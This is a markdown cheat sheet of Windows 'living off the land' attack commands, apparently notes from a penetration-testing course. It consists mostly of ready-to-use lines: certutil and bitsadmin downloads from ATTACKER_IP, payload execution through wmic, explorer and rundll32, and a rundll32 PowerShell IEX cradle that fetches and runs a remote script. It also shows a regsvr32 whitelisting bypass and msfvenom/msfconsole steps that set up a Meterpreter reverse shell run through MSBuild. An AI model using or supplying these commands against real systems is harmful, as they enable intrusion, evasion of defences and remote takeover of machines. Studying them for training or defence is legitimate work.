# LLiving Off The Land Binaries
[LOLBAS](https://lolbas-project.github.io/#) - Living Off The Land Binaries, Scripts and Libraries

## File Operations
### Certutil
```
Certutil - file download, file encoding/decoding

certutil -URLcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe
certutil -encode payload.exe Encoded-payload.txt
```

### BITSAdmin
```
BITSAdmin - file download, file execution

bitsadmin.exe /transfer /Download /priority Foreground http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe
```

### FindStr
```
FindStr - file download from SMB Share

findstr /V NotPresentString \\MachineName\ShareFolder\payload.exee > c:\Windows\Temp\payload.exe
```

## File Execution
### Explorer
```
Explorer - file execution

explorer.exe /root,"c:\Windows\Temp\payload.exe"
```

### Wmic
```
Wmic - file execution

wmic.exe process call create "cmd /c c:\Windows\Temp\payload.exe"
```

### Rundll32
```
Rundll32 - file execution

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"c:\Windows\Temp\payload.exe\");window.close()");
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ATTTACKER_IP/payload.ps1');");
```

## Bypassing Application Whitelisting
### Regsvr32
```
Regsvr32 - bypass application whitelisting

C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version

c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\payload.dll
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\payload.dll
```

### Bourne Again Shell (Bash)

```
Bash - bypass application whitelisting

bash.exe -c "c:\Windows\Temp\payload.exe"
```

## Misc
### Shortcuts
To use the shortcut modification technique, attacker can set the target section to execute different files using: Rundll32, Powershell, Regsvr32.

### PowerLessShell

[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild).

Example:
```
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f psh-reflection > payload.ps1
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost ATTACKER_IP;set lport ATTACKER_PORT;exploit"
python2 PowerLessShell.py -type powershell -source /tmp/payload.ps1 -output payload.csproj

Trasfer file to target machine...

c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\USER\Desktop\payload.csproj
```



